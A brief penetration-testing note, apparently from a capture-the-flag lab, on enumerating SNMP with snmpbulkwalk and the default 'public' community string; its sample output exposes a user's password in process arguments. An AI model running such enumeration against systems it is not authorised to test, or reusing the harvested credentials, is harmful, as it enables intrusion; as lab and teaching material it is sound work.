# Attacking SNMP

Install and enable the MIBs:

```console
$ sudo apt install snmp-mibs-downloader
$ sudo sed -i 's/^mibs :/#mibs :/' /etc/snmp/snmp.conf
```

Syntax for scanning a target named `t`:

```console
$ snmpbulkwalk -c public -v2c t .  # Note the dot at the end!
```

Example:

```text
$ time snmpbulkwalk -c public -v2c t .
SNMPv2-MIB::sysDescr.0 = STRING: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (1412195) 3:55:21.95
SNMPv2-MIB::sysContact.0 = STRING: Daniel
SNMPv2-MIB::sysName.0 = STRING: pandora
SNMPv2-MIB::sysLocation.0 = STRING: Mississippi
...
HOST-RESOURCES-MIB::hrSWRunParameters.785 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.815 = STRING: "-f"
HOST-RESOURCES-MIB::hrSWRunParameters.817 = STRING: "-f"
HOST-RESOURCES-MIB::hrSWRunParameters.829 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
HOST-RESOURCES-MIB::hrSWRunParameters.839 = STRING: "-f"
HOST-RESOURCES-MIB::hrSWRunParameters.843 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
HOST-RESOURCES-MIB::hrSWRunParameters.844 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.858 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.870 = STRING: "-o -p -- \\u --noclear tty1 linux"
HOST-RESOURCES-MIB::hrSWRunParameters.938 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.955 = STRING: "--no-debug"
HOST-RESOURCES-MIB::hrSWRunParameters.1118 = STRING: "-u daniel -p HotelBabylon23"
...
real    1m32.068s
user    0m0.127s
sys     0m0.074s
```
